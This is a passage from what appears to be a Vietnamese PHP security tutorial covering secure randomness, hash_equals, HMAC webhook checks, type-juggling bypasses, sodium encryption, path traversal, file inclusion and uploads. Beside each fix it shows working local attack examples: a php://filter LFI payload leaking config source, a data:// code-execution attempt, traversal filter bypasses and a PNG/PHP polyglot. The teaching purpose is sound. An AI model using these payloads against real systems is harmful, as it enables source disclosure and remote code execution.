// PHP 8.3+: chọn ký tự từ một bảng chữ cái tuỳ ý (bỏ các ký tự dễ nhầm như 0/O, 1/I)
$randomizer = new Random\Randomizer();           // engine mặc định là Random\Engine\Secure
echo get_class($randomizer->engine), "\n";       // in ra: Random\Engine\Secure
$code = $randomizer->getBytesFromString('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', 8);
echo strlen($code), "\n";                        // in ra: 8

try {
    random_int(10, 1);
} catch (ValueError $e) {
    echo $e->getMessage(), "\n";
    // in ra: random_int(): Argument #1 ($min) must be less than or equal to argument #2 ($max)
}
```

Vài điểm cần biết:

- Manual ghi `random_bytes` phù hợp cho mọi mục đích, kể cả bí mật dài hạn như khoá mã hoá. Nếu không có
  nguồn entropy, hàm ném `Random\RandomException` (từ 8.2; trước đó là `Exception` thường), không bao giờ
  âm thầm trả dữ liệu yếu. Đây là hành vi *fail closed* đúng nghĩa.
- Vì sao `random_int(0, 999999)` mà không `random_bytes` rồi `% 1000000`? Phép chia lấy dư trên một dải
  không chia hết sinh ra *modulo bias*: vài giá trị xuất hiện thường hơn giá trị khác. `random_int` tự xử
  lý để phân phối đều.
- 32 byte (256 bit) là mức phổ biến cho token. Đừng cắt ngắn token chỉ vì URL "trông dài".
- UUID v4 chỉ không đoán được khi được sinh bằng CSPRNG; UUID v1 chứa thời gian và địa chỉ MAC, không
  dùng làm bí mật.

**Lưu hash của token, không lưu token.** Với token đặt lại mật khẩu, gửi token gốc trong email cho người
dùng, còn DB chỉ lưu `hash('sha256', $token)` kèm hạn dùng. Lộ DB thì kẻ tấn công không có token dùng
được. Ở đây SHA-256 nhanh là đủ (khác mật khẩu ở mục 5), vì token có 256 bit ngẫu nhiên, không thể đoán
bằng từ điển. Khi người dùng bấm link, hash token nhận được rồi tra DB theo hash đó; token dùng một lần
xong thì xoá.

### 6.3 `hash_equals` và timing attack

*Timing attack* là đoán bí mật bằng cách đo thời gian phản hồi. Phép so sánh chuỗi thông thường (`===`,
`strcmp`) dừng ngay ở byte khác nhau đầu tiên:

```
bí mật:    a 7 f 3 9 c ...
đoán 1:    b . . . . .     ← khác ngay byte 1 → so 1 byte, trả lời nhanh
đoán 2:    a 0 . . . .     ← byte 1 đúng, khác byte 2 → so 2 byte, chậm hơn một chút
đoán 3:    a 7 0 . . .     ← đúng 2 byte đầu → chậm hơn nữa
```

Chênh lệch mỗi bước rất nhỏ, nhưng lặp đủ nhiều lần và lấy thống kê là đo được, rồi đoán dần từng byte.
`hash_equals()` luôn so **hết** chuỗi, thời gian không phụ thuộc vị trí khác nhau:

```php
hash_equals(string $known_string, string $user_string): bool
```

- Tham số thứ nhất là giá trị bí mật **bạn** biết (token trong session, chữ ký bạn tự tính); tham số thứ
  hai là giá trị **người dùng** gửi. Manual nhấn mạnh thứ tự này.
- Hai chuỗi khác độ dài thì trả `false` ngay, nên độ dài của bí mật có thể lộ. Với token, HMAC có độ dài
  cố định thì điều này không đáng ngại.
- Cả hai tham số phải là `string`; truyền mảng hay `null` ném `TypeError` (mục 4.3 kiểm `is_string`
  trước vì vậy).

Dùng `hash_equals` mỗi khi so **bí mật với input**: CSRF token, API key, chữ ký HMAC, token trong link.
Mật khẩu thì dùng `password_verify` (đã so an toàn bên trong). Không bao giờ dùng `==` cho những so sánh
này (mục 7 giải thích vì sao `==` còn tệ hơn cả `===`).

### 6.4 HMAC: chứng minh dữ liệu không bị sửa

Khi gửi dữ liệu qua một kênh người dùng chạm được (cookie, link, webhook) và cần biết chắc nó không bị
sửa, ta gắn kèm một *chữ ký*. *HMAC* (*Hash-based Message Authentication Code*) là hash có trộn một khoá
bí mật: chỉ ai có khoá mới tạo được HMAC đúng. PHP: `hash_hmac(string $algo, string $data, string $key)`.

⚠️ Đừng tự ghép kiểu `hash('sha256', $secret . $data)`. Với SHA-256 (và MD5, SHA-1, SHA-512), cách
ghép này bị *length extension attack*: biết hash của `secret || data`, kẻ tấn công tính được hash hợp lệ
của `secret || data || padding || dữ_liệu_thêm` mà không cần biết secret. HMAC được thiết kế để tránh
đúng lỗi này. Quy tắc: cần chữ ký thì gọi `hash_hmac`, không tự chế.

Ứng dụng thường gặp nhất là kiểm chữ ký **webhook** (cổng thanh toán gọi về server của bạn báo "đơn đã
thanh toán"):

```php
<?php
declare(strict_types=1);

/**
 * Kiểm chữ ký webhook dạng "HMAC-SHA256 của '<timestamp>.<raw body>'".
 * Đây là sơ đồ minh hoạ; mỗi nhà cung cấp có định dạng riêng, đọc tài liệu của họ.
 */
function verifyWebhook(
    string $rawBody,
    string $signature,
    string $timestamp,
    #[\SensitiveParameter] string $secret,
    int $now,
): bool {
    // Chống replay: chỉ nhận request ký trong vòng 5 phút
    if (!ctype_digit($timestamp) || abs($now - (int) $timestamp) > 300) {
        return false;
    }
    $expected = hash_hmac('sha256', $timestamp . '.' . $rawBody, $secret);
    return hash_equals($expected, $signature);   // giá trị mình tính trước, của người gửi sau
}

$secret = 'whsec_demo_khong_dung_that';
$body   = '{"order_id":42,"status":"paid"}';     // raw body, đúng từng byte nhận được
$ts     = '1790000000';
$sig    = hash_hmac('sha256', $ts . '.' . $body, $secret);   // phía nhà cung cấp tính

var_dump(verifyWebhook($body, $sig, $ts, $secret, 1790000060));
// in ra: bool(true)    ký hợp lệ
var_dump(verifyWebhook('{"order_id":42,"status":"refunded"}', $sig, $ts, $secret, 1790000060));
// in ra: bool(false)   body bị sửa
var_dump(verifyWebhook($body, $sig, $ts, $secret, 1790009999));
// in ra: bool(false)   quá hạn: có thể là request cũ bị gửi lại (replay)
$reencoded = json_encode(json_decode($body, true), JSON_PRETTY_PRINT);
var_dump(verifyWebhook($reencoded, $sig, $ts, $secret, 1790000060));
// in ra: bool(false)   JSON tương đương nhưng khác byte, chữ ký lệch
```

Ba bài học từ ví dụ:

- Tính HMAC trên **raw body** đúng như nhận được (`file_get_contents('php://input')` trong PHP thuần),
  không trên mảng đã `json_decode` rồi `json_encode` lại: thứ tự key, khoảng trắng, cách escape Unicode
  đổi một byte là chữ ký lệch.
- HMAC chỉ chứng minh "nội dung này do bên có khoá tạo ra", không chống gửi lại. Ký kèm timestamp và
  từ chối request cũ, hoặc lưu ID sự kiện đã xử lý.
- So bằng `hash_equals`. HMAC không giấu nội dung (body vẫn đọc được); muốn giấu thì cần mã hoá (mục 8).

## 7. Type juggling trong so sánh: magic hash

### 7.1 Nhắc lại: `==` đổi kiểu trước khi so

[Chương 04](04-kieu-du-lieu.md) đã giải thích: `===` so cả kiểu lẫn giá trị; `==` (so lỏng, *loose
comparison*) đổi hai vế về cùng kiểu theo một bộ luật rồi mới so. Việc tự đổi kiểu này gọi là *type
juggling*. Ba luật gây hậu quả bảo mật:

1. Hai vế đều là *numeric string* (chuỗi trông như số, kể cả dạng khoa học `"1e3"`) thì được so **như
   số**: `"1e3" == "1000"` là `true`.
2. Một vế là `bool` thì vế kia được đổi sang `bool`: mọi chuỗi khác `""` và `"0"` đều thành `true`.
3. `int` so với chuỗi **không** phải số: PHP 7 đổi chuỗi thành số (`"abc"` thành `0`), PHP 8 đổi số
   thành chuỗi rồi so chuỗi. Đây là thay đổi lớn của PHP 8.0.

⚠️ `declare(strict_types=1)` **không** ảnh hưởng tới `==`. Nó chỉ quy định việc ép kiểu tham số khi gọi
hàm và giá trị trả về.

### 7.2 Magic hash

Chuỗi `"0e"` theo sau toàn chữ số là numeric string dạng khoa học, giá trị là 0 × 10^n = 0. Một số
input cho ra hash hex có đúng dạng đó, gọi là *magic hash*:

```php
<?php
declare(strict_types=1);   // strict_types KHÔNG ảnh hưởng tới toán tử ==

$a = md5('240610708');
$b = md5('QNKCDZO');
echo $a, "\n";             // in ra: 0e462097431906509019562988736854
echo $b, "\n";             // in ra: 0e830400451993494058024219903391
var_dump($a == $b);        // in ra: bool(true)    hai hash khác nhau mà "bằng nhau"
var_dump($a === $b);       // in ra: bool(false)

echo sha1('10932435112'), "\n";   // in ra: 0e07766915004133176347055865026311692244
echo sha1('aaroZmOk'), "\n";      // in ra: 0e66507019969427134894567494305185566735
var_dump(sha1('10932435112') == sha1('aaroZmOk'));   // in ra: bool(true)

var_dump('0e123' == '0');  // in ra: bool(true)
var_dump('1e3' == '1000'); // in ra: bool(true)
```

Hệ quả: code so hash bằng `==` (ví dụ hệ thống cũ lưu mật khẩu bằng MD5 và kiểm `md5($input) ==
$storedHash`) coi mọi hash dạng `0e` + chữ số là bằng nhau. Nếu hash lưu trong DB rơi vào dạng này, bất
kỳ input nào có magic hash (danh sách đã được công bố rộng rãi) cũng "đúng mật khẩu". Xác suất một hash
ngẫu nhiên có dạng này rất thấp, nên magic hash chủ yếu là minh hoạ kinh điển cho một sự thật quan
trọng hơn: **`==` không so chuỗi, nó so "giá trị sau khi đoán kiểu"**.

⚠️ PHP 8 **không** sửa magic hash. Thay đổi của PHP 8.0 chỉ áp dụng khi so số với chuỗi không phải số
(luật 3). Hai vế ở đây đều là numeric string (luật 1), luật này giữ nguyên. Đừng trả lời phỏng vấn rằng
"PHP 8 hết magic hash rồi".

### 7.3 Khi kẻ tấn công điều khiển được kiểu dữ liệu

Nguy hiểm thực tế hơn magic hash là khi input không phải chuỗi. Form HTML chỉ gửi chuỗi (hoặc mảng, qua
`name[]`), nhưng JSON thì gửi được `true`, `false`, số, `null`:

```php
<?php
declare(strict_types=1);

$apiKey = 'a7f39c2e5b81d04f';                 // khoá bí mật lưu ở server

// API nhận JSON: {"api_key": "..."}
function checkLoose(string $json, string $apiKey): bool
{
    $data = json_decode($json, true);
    return $data['api_key'] == $apiKey;       // ❌ so lỏng
}

function checkStrict(string $json, string $apiKey): bool
{
    $data = json_decode($json, true);
    $sent = $data['api_key'] ?? null;
    return is_string($sent) && hash_equals($apiKey, $sent);   // ✅ kiểm kiểu, rồi so an toàn
}

$attack = '{"api_key": true}';                // gửi boolean, không phải chuỗi
var_dump(checkLoose($attack, $apiKey));       // in ra: bool(true)   ⚠️ qua được, trên cả PHP 7 lẫn PHP 8
var_dump(checkStrict($attack, $apiKey));      // in ra: bool(false)
var_dump(checkStrict('{"api_key": "a7f39c2e5b81d04f"}', $apiKey));   // in ra: bool(true)
```

`true == 'a7f39c2e5b81d04f'` là `true` theo luật 2: chuỗi khác rỗng đổi sang bool là `true`. Kẻ tấn công
không cần biết khoá.

Bảng dưới tổng hợp các so sánh hay gây lỗi, đã chạy thật trên PHP 7.4 và PHP 8.5:

| Biểu thức | PHP 7.4 | PHP 8.x | Ghi chú |
|---|---|---|---|
| `0 == "abc"` | `true` | `false` | Luật 3 đổi ở PHP 8.0 |
| `"0e123" == "0e456"` | `true` | `true` | Magic hash, PHP 8 không đổi |
| `"10" == "1e1"` | `true` | `true` | Hai numeric string so như số |
| `true == "abc"` | `true` | `true` | Bypass bằng JSON `true` |
| `null == false` | `true` | `true` | |
| `in_array(0, ["abc"])` | `true` | `false` | `in_array` mặc định so lỏng |
| `in_array("1abc", [1])` | `true` | `false` | |
| `strcmp([], "secret")` | `NULL` (kèm warning) | ném `TypeError` | PHP 7: `strcmp(...) == 0` thành `NULL == 0`, tức `true` |

Dòng cuối là một bypass kinh điển của PHP 7: code `if (strcmp($_GET['pass'], $secret) == 0)` bị qua mặt
bằng `?pass[]=x`. PHP 8 ném `TypeError` cho hàm nội bộ nhận sai kiểu, nên lỗi này thành exception thay vì
lỗ hổng, nhưng bài học vẫn là kiểm kiểu input.

### 7.4 Quy tắc

- `===` ở mọi nơi; `==` chỉ khi bạn chủ ý muốn so lỏng và hiểu rõ luật.
- So bí mật (token, hash, chữ ký) bằng `hash_equals`, mật khẩu bằng `password_verify`. Cả hai chỉ nhận
  `string`.
- Kiểm kiểu input trước khi dùng: `is_string()`, `filter_var()` (mục 1.3). Đừng giả định `$_GET['x']`
  luôn là chuỗi (có thể là mảng) hay `$data['x']` từ JSON luôn là chuỗi (có thể là bool, số, `null`).
- Các hàm có tham số "strict" thì bật lên: `in_array($x, $list, true)`, `array_search($x, $list, true)`,
  `array_keys($arr, $x, true)`. `switch` so lỏng; `match` (PHP 8.0) so bằng `===`
  ([Chương 07](07-toan-tu-dieu-khien.md)).

## 8. Mã hoá dữ liệu với sodium

### 8.1 Encode, hash, HMAC, encrypt: chọn đúng công cụ

Bốn công cụ này hay bị nhầm. Hỏi hai câu: "có cần khoá không?" và "có cần lấy lại giá trị gốc không?":

| Công cụ | Ví dụ trong PHP | Cần khoá? | Lấy lại giá trị gốc? | Dùng cho |
|---|---|---|---|---|
| Encode | `base64_encode`, `bin2hex`, `rawurlencode` | Không | Có, ai cũng làm được | Biểu diễn byte qua kênh văn bản. **Không bảo mật gì** |
| Hash | `hash('sha256', ...)` | Không | Không | Checksum, lưu hash của token (6.2) |
| Hash mật khẩu | `password_hash` | Không | Không | Chỉ mật khẩu (mục 5) |
| HMAC | `hash_hmac` | Có | Không (và không giấu nội dung) | Chứng minh dữ liệu không bị sửa (6.4) |
| Mã hoá | `sodium_crypto_*` | Có | Có, nếu có khoá | Dữ liệu cần **đọc lại**: số CCCD, số tài khoản, token truy cập API bên thứ ba |

⚠️ Chuỗi "trông loằng ngoằng" chưa chắc đã được bảo vệ: cookie chứa `eyJ1c2VyIjo0Mn0=` chỉ là base64 của
`{"user":42}`, ai cũng giải được và sửa được.

### 8.2 Vì sao dùng sodium thay vì tự ghép OpenSSL

PHP có hai extension mã hoá: `openssl` và `sodium`. `openssl_encrypt()` cho bạn tự chọn thuật toán, mode,
IV, padding, và đó chính là vấn đề: rất nhiều cách ghép sai mà code vẫn chạy.

- Chọn mode ECB: khối dữ liệu giống nhau cho ciphertext giống nhau, lộ cấu trúc dữ liệu.
- Dùng AES-CBC mà không kèm MAC: kẻ tấn công **sửa được ciphertext** để đổi plaintext có kiểm soát, và
  nếu server phản hồi khác nhau giữa "padding sai" và "giải mã lỗi" thì có thể giải mã dần từng byte
  (*padding oracle*).
- Dùng lại *nonce* (hay IV) với cùng khoá: với một số thuật toán (như AES-GCM) điều này phá cả tính bí
  mật lẫn tính toàn vẹn.
- Dùng mật khẩu người đặt trực tiếp làm khoá.

Extension `sodium` (bọc thư viện *libsodium*) đi kèm PHP từ 7.2, và được thiết kế để **khó dùng sai**:
thuật toán đã chọn sẵn, mọi hàm mã hoá đều *có xác thực* (*authenticated encryption*: phát hiện được
ciphertext bị sửa), nonce đủ dài để sinh ngẫu nhiên mà không lo trùng. Trên Linux, PHP phải được build với
`--with-sodium`; phần lớn bản build phổ biến bật sẵn. Kiểm bằng `extension_loaded('sodium')`.

### 8.3 Mã hoá đối xứng có xác thực: XChaCha20-Poly1305

*Mã hoá đối xứng* dùng cùng một khoá cho cả mã hoá và giải mã. Hàm nên dùng trong sodium là
`sodium_crypto_aead_xchacha20poly1305_ietf_encrypt()`, manual gọi XChaCha20-Poly1305 là lựa chọn tốt nhất
trong các mode AEAD có sẵn. *AEAD* (*Authenticated Encryption with Associated Data*) nghĩa là:

- Nội dung được giấu (*encryption*) và gắn kèm một *tag* xác thực 16 byte (*authentication*): sửa dù
  một bit thì giải mã thất bại.
- Có thể kèm *associated data*: dữ liệu **không** được mã hoá nhưng **được xác thực** cùng. Dùng để gắn
  ciphertext với ngữ cảnh của nó, ví dụ "đây là CCCD của user 42". Chép ciphertext sang dòng của user
  43 thì giải mã thất bại.

```php
<?php
declare(strict_types=1);

const NONCE_LEN = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;   // 24
const TAG_LEN   = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES;      // 16

/** Mã hoá một giá trị để lưu DB. $context gắn ciphertext với đúng chỗ nó thuộc về. */
function encryptField(string $plaintext, string $context, #[\SensitiveParameter] string $key): string
{
    $nonce  = random_bytes(NONCE_LEN);                  // nonce MỚI cho MỖI lần mã hoá
    $cipher = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($plaintext, $context, $nonce, $key);
    return base64_encode($nonce . $cipher);             // nonce không bí mật, lưu chung
}

/** Trả null nếu dữ liệu hỏng, bị sửa, sai khoá hoặc sai ngữ cảnh. */
function decryptField(string $stored, string $context, #[\SensitiveParameter] string $key): ?string
{
    $raw = base64_decode($stored, true);
    if ($raw === false || strlen($raw) < NONCE_LEN + TAG_LEN) {
        return null;
    }
    $nonce  = substr($raw, 0, NONCE_LEN);
    $cipher = substr($raw, NONCE_LEN);
    $plain  = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($cipher, $context, $nonce, $key);
    return $plain === false ? null : $plain;
}

// Thật: sinh khoá MỘT lần, cất vào secret manager/biến môi trường (mục 14). Ở đây sinh tại chỗ cho dễ chạy.
$key = sodium_crypto_aead_xchacha20poly1305_ietf_keygen();   // 32 byte

$stored = encryptField('079123456789', 'users.42.national_id', $key);
echo strlen(base64_decode($stored, true)), "\n";
// in ra: 52      (24 byte nonce + 12 byte dữ liệu + 16 byte tag)
var_dump(decryptField($stored, 'users.42.national_id', $key));
// in ra: string(12) "079123456789"
var_dump(decryptField($stored, 'users.43.national_id', $key));
// in ra: NULL    (đúng khoá nhưng sai ngữ cảnh: ciphertext bị chép sang dòng khác)

$raw = base64_decode($stored, true);
$raw[30] = chr(ord($raw[30]) ^ 1);                    // lật 1 bit ở phần ciphertext
var_dump(decryptField(base64_encode($raw), 'users.42.national_id', $key));
// in ra: NULL    (bị sửa)

var_dump(encryptField('079123456789', 'users.42.national_id', $key) === $stored);
// in ra: bool(false)   (nonce mới mỗi lần nên cùng dữ liệu cho ciphertext khác nhau)
```

Môi trường chạy thử của chương này không có extension sodium. Logic PHP quanh hàm sodium (cắt nonce, base64,
xử lý `false`) đã được chạy thử với một hàm giả lập, và các kết quả (độ dài 52, giải mã thất bại khi sai
ngữ cảnh hoặc bị sửa) đã được đối chiếu bằng libsodium thật qua binding JavaScript. Trên máy có sodium, bạn
sẽ thấy đúng output như comment.

Nếu không cần associated data, `sodium_crypto_secretbox($message, $nonce, $key)` /
`sodium_crypto_secretbox_open(...)` là API đơn giản hơn (thuật toán XSalsa20-Poly1305, nonce 24 byte,
khoá 32 byte, `open` trả `false` khi bị sửa).

### 8.4 Quản lý khoá

Thuật toán tốt mà khoá để lộ thì vô nghĩa. Các quy tắc:

- Khoá sinh bằng CSPRNG (`sodium_crypto_aead_xchacha20poly1305_ietf_keygen()` hoặc `random_bytes(32)`),
  **không** phải mật khẩu tự nghĩ. Khoá là byte thô; khi cần cất vào biến môi trường thì base64 nó.
- Khoá không nằm trong code, không commit vào git, không lưu cùng DB với dữ liệu nó bảo vệ. Lộ DB mà khoá
  nằm trong DB thì mã hoá không có tác dụng gì. Chỗ cất: biến môi trường, file cấu hình ngoài web root,
  tốt nhất là *secret manager*/*KMS* của nhà cung cấp cloud (mục 14).
- Lên kế hoạch xoay khoá (*key rotation*) từ đầu: lưu kèm phiên bản khoá trong dữ liệu (ví dụ tiền tố
  `v1:`), để giải mã bằng khoá cũ và mã hoá lại bằng khoá mới dần dần.
- `sodium_memzero($key)` ghi đè biến bằng byte 0 sau khi dùng xong, giảm thời gian khoá nằm trong bộ nhớ.

⚠️ Mã hoá làm mất khả năng tìm kiếm: cùng một số CCCD mã hoá hai lần cho hai ciphertext khác nhau (ví dụ
trên), nên `WHERE national_id = ?` không còn chạy được. Cách thường dùng là lưu thêm một cột
`hash_hmac('sha256', $nationalId, $indexKey)` (với một khoá **khác**) để tra cứu và đặt unique index;
cột này gọi là *blind index*.

### 8.5 Mã hoá khoá công khai và chữ ký

Khi hai bên không chia sẻ được một khoá chung, dùng cặp khoá (*public key*/*private key*). Sodium có
sẵn:

| Việc | Hàm | Ghi chú |
|---|---|---|
| Ký và kiểm chữ ký (Ed25519) | `sodium_crypto_sign_keypair`, `sodium_crypto_sign_detached`, `sodium_crypto_sign_verify_detached` | Bên kiểm chỉ cần public key, không tự tạo được chữ ký. Khác HMAC ở điểm này |
| Mã hoá gửi một người nhận | `sodium_crypto_box_seal`, `sodium_crypto_box_seal_open` | Ai có public key cũng mã hoá được, chỉ người giữ private key giải được |
| Mã hoá giữa hai bên đã biết nhau | `sodium_crypto_box`, `sodium_crypto_box_open` | Mỗi bên có cặp khoá riêng |

Laravel có sẵn `Crypt::encryptString()`/`decryptString()` dùng `APP_KEY`; cipher mặc định trong
`config/app.php` là `AES-256-CBC`, và Encrypter của Laravel tự gắn MAC HMAC-SHA256 nên vẫn là mã hoá có
xác thực. Khi dùng Laravel, đó là lựa chọn mặc định hợp lý (file `.env` và cấu hình ở
[Chương 23](23-laravel-gioi-thieu.md); rủi ro khi lộ `APP_KEY` ở mục 14).

## 9. File: path traversal, include theo input, upload

### 9.1 Path traversal

*Path traversal* (hay *directory traversal*) xảy ra khi input được ghép vào đường dẫn file, và chuỗi
`../` đưa đường dẫn ra ngoài thư mục bạn định cho phép. Tính năng "tải file" kiểu
`/download.php?name=report.txt` là chỗ hay gặp nhất:

```php
<?php
declare(strict_types=1);

// Dựng thư mục thử: <root>/files chứa file cho phép tải, <root>/secret.txt nằm ngoài
$root = sys_get_temp_dir() . '/demo';
@mkdir("$root/files", 0777, true);
file_put_contents("$root/files/report.txt", "bao cao quy 3\n");
file_put_contents("$root/secret.txt", "DB_PASSWORD=hunter2\n");

// ❌ Ghép thẳng input vào đường dẫn
function downloadUnsafe(string $baseDir, string $name): string
{
    return (string) file_get_contents($baseDir . '/' . $name);
}

echo downloadUnsafe("$root/files", 'report.txt');      // in ra: bao cao quy 3
echo downloadUnsafe("$root/files", '../secret.txt');   // in ra: DB_PASSWORD=hunter2   ⚠️

// ✅ Chuẩn hoá đường dẫn rồi kiểm nó vẫn nằm trong thư mục gốc
function safePath(string $baseDir, string $name): ?string
{
    $base = realpath($baseDir);
    $full = realpath($baseDir . '/' . $name);       // giải ../ và symlink; false nếu không tồn tại
    if ($base === false || $full === false) {
        return null;
    }
    // so với "$base/" để "<root>/files-secret" không lọt qua kiểm tra tiền tố "<root>/files"
    return str_starts_with($full, $base . DIRECTORY_SEPARATOR) ? $full : null;
}

var_dump(safePath("$root/files", 'report.txt') !== null);   // in ra: bool(true)
var_dump(safePath("$root/files", '../secret.txt'));         // in ra: NULL
var_dump(basename('../../secret.txt'));                     // in ra: string(10) "secret.txt"

try {
    file_get_contents("$root/files/report.txt\0.png");      // byte NUL trong đường dẫn
} catch (ValueError $e) {
    echo $e->getMessage(), "\n";
    // in ra: file_get_contents(): Argument #1 ($filename) must not contain any null bytes
}
```

Các cách vượt bộ lọc tự viết mà bạn cần biết để không viết bộ lọc kiểu đó:

- Đường dẫn tuyệt đối: `/etc/passwd`.
- Lọc `../` một lần: `....//` sau khi xoá `../` lại còn `../`.
- Mã hoá URL: `%2e%2e%2f` (PHP đã giải mã một lần khi điền `$_GET`; nếu code giải mã thêm lần nữa thì
  `%252e%252e%252f` thành `../`).
- Byte NUL để cắt đuôi (`report.php%00.png`): chỉ còn tác dụng với PHP rất cũ. PHP 8 ném `ValueError` như
  ví dụ trên.

Thứ tự ưu tiên khi sửa:

1. **Không đưa input vào đường dẫn**. Lưu file theo ID: `/download.php?id=42`, tra bảng `files` lấy tên
   file thật trên đĩa (tên do server sinh, mục 9.3), và kiểm người dùng có quyền với file 42 không.
2. Buộc phải nhận tên file: `basename()` để bỏ mọi phần thư mục, rồi kiểm tên thuộc allowlist hoặc khớp
   regex chặt (`/^[a-z0-9_-]+\.pdf$/`).
3. Lớp kiểm cuối: `realpath()` rồi kiểm tiền tố như `safePath` ở trên.

### 9.2 `include`/`require` theo input: LFI và RFI

`include` không chỉ đọc file mà **chạy** nó như code PHP. Đưa input vào `include` là lỗ hổng *file
inclusion*, nghiêm trọng hơn path traversal nhiều:

- *LFI* (*Local File Inclusion*): include một file có sẵn trên server. Kẻ tấn công đọc được source code
  (kèm mật khẩu DB trong config), hoặc chạy code nếu họ đã đưa được code vào một file nào đó trên server
  (file upload, file log có chứa `User-Agent` họ gửi).
- *RFI* (*Remote File Inclusion*): include file từ URL của kẻ tấn công. Chỉ xảy ra khi
  `allow_url_include = On`. Mặc định là `Off`, và từ PHP 7.4 việc bật nó phát cảnh báo deprecated lúc
  khởi động.

```php
<?php
declare(strict_types=1);

$dir = sys_get_temp_dir() . '/lfi';
@mkdir("$dir/pages", 0777, true);
file_put_contents("$dir/pages/home.php", "<?php echo \"Trang chủ\\n\";");
file_put_contents("$dir/config.php", "<?php \$dbPassword = 'hunter2';");
chdir("$dir/pages");

// ❌ include theo input: index.php?page=home
function render(string $page): void
{
    include $page . '.php';
}

render('home');
// in ra: Trang chủ

// Kẻ tấn công: ?page=php://filter/convert.base64-encode/resource=../config
render('php://filter/convert.base64-encode/resource=../config');
// in ra: PD9waHAgJGRiUGFzc3dvcmQgPSAnaHVudGVyMic7
echo "\n", base64_decode('PD9waHAgJGRiUGFzc3dvcmQgPSAnaHVudGVyMic7'), "\n";
// in ra: <?php $dbPassword = 'hunter2';        <- đọc được source code của config

render('data://text/plain;base64,' . base64_encode('<?php echo "RCE\n";') . '#');
// in ra: Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 ...
//        (kèm hai warning "Failed to open stream" / "Failed opening"); code của kẻ tấn công KHÔNG chạy
```

Ví dụ cho thấy hai điều. Thứ nhất, wrapper `php://filter` không bị `allow_url_include` chặn, nên chỉ
cần LFI là đọc được mọi file PHP dưới dạng base64 (không chạy, nên không lộ qua output thường). Thứ
hai, `allow_url_include = 0` chặn được `data://` và `http://`, nhưng đó chỉ là lớp phòng thủ phụ.

Cách sửa duy nhất đáng tin: input chỉ được dùng để **chọn** trong một allowlist, giống mục 2.3:

```php
<?php
declare(strict_types=1);

// Cấu trúc: index.php (file này) và thư mục pages/ chứa home.php, about.php
const PAGES = [
    'home'  => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
];

$page = $_GET['page'] ?? 'home';
$file = is_string($page) ? (PAGES[$page] ?? null) : null;
if ($file === null) {
    http_response_code(404);
    exit;
}
include $file;          // đường dẫn luôn là một trong các hằng số ở trên
```

Trong ứng dụng hiện đại, router của framework (Laravel `routes/web.php`) thay hẳn cho mẫu
`include $_GET['page']`; nhưng code cũ và các script quản trị nhỏ vẫn hay dính lỗi này.

### 9.3 Upload file an toàn

Upload là nơi gặp nhau của nhiều lỗ hổng: chạy code trên server (upload `shell.php`), XSS (upload file
HTML hoặc SVG chứa script), path traversal qua tên file, DoS bằng file khổng lồ. Mọi thông tin trong
`$_FILES['x']` trừ `tmp_name` và `error` đều do client gửi: `name` (tên file), `type` (MIME), `size`
(PHP tự đo, nhưng nội dung là do client chọn). Cách `$_FILES` hoạt động ở
[Chương 15](15-php-va-web.md).

**Không tin đuôi file và MIME client gửi, nhưng cũng đừng tin tuyệt đối "magic bytes".** `finfo` đọc vài
byte đầu file để đoán kiểu thật, tốt hơn nhiều so với `$_FILES['x']['type']`. Nhưng một file có thể vừa
là ảnh hợp lệ vừa chứa code PHP (*polyglot*):

```php
<?php
declare(strict_types=1);

$dir = sys_get_temp_dir() . '/upload-demo';
@mkdir($dir, 0777, true);

// Một ảnh PNG 1x1 hợp lệ, rồi NỐI THÊM code PHP vào cuối file
$png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
$tmp = "$dir/phpA1b2C3";                         // giống tmp_name của một file upload
file_put_contents($tmp, $png . '<?php echo "Đã chạy code của kẻ tấn công\n"; ?>');

var_dump((new finfo(FILEINFO_MIME_TYPE))->file($tmp));   // in ra: string(9) "image/png"
$size = getimagesize($tmp);
var_dump($size[0], $size[1]);                             // in ra hai dòng: int(1) và int(1)   (ảnh 1x1 hợp lệ)

// Nếu file này bị include (LFI) hoặc web server cho chạy PHP trong thư mục upload:
include $tmp;
// in ra: (các byte nhị phân của ảnh PNG) rồi "Đã chạy code của kẻ tấn công"
```

`finfo` và `getimagesize` đều nói đây là ảnh PNG đúng chuẩn, và đúng là vậy. Nhưng khi PHP đọc file này
như code, mọi thứ trước `<?php` được in ra nguyên văn, phần sau thì chạy. Kết luận: kiểm tra nội dung là
**một lớp**, còn lớp quyết định là file upload **không bao giờ được chạy như PHP**.

Một hàm xử lý upload ảnh đại diện gom đủ các lớp:

```php
<?php
declare(strict_types=1);

const MAX_BYTES = 2 * 1024 * 1024;                                   // 2 MiB
const ALLOWED   = ['image/png' => 'png', 'image/jpeg' => 'jpg', 'image/webp' => 'webp'];

/**
 * Lưu ảnh đại diện; trả về tên file đã lưu, ném exception nếu không hợp lệ.
 *
 * @param array{name: string, type: string, tmp_name: string, error: int, size: int} $file
 */
function storeAvatar(array $file, string $storageDir): string
{
    if ($file['error'] !== UPLOAD_ERR_OK) {
        throw new RuntimeException('Upload lỗi, mã ' . $file['error']);
    }
    if (!is_uploaded_file($file['tmp_name'])) {                     // chỉ nhận file đến từ HTTP POST
        throw new RuntimeException('Không phải file upload');
    }
    if (filesize($file['tmp_name']) > MAX_BYTES) {
        throw new RuntimeException('File quá lớn');
    }
    // Không tin $file['name'] và $file['type']: cả hai do client gửi
    $mime = (new finfo(FILEINFO_MIME_TYPE))->file($file['tmp_name']);
    $ext  = ALLOWED[$mime] ?? null;
    if ($ext === null) {
        throw new RuntimeException('Chỉ nhận ảnh PNG, JPEG, WebP');
    }
    $size = getimagesize($file['tmp_name']);
    if ($size === false || $size[0] > 4000 || $size[1] > 4000) {    // chặn ảnh kích thước khổng lồ
        throw new RuntimeException('Kích thước ảnh không hợp lệ');
    }
    // Tên do server sinh: không còn ../, không còn .php, không trùng nhau
    $name = bin2hex(random_bytes(16)) . '.' . $ext;
    if (!move_uploaded_file($file['tmp_name'], $storageDir . '/' . $name)) {
        throw new RuntimeException('Không lưu được file');
    }
    return $name;
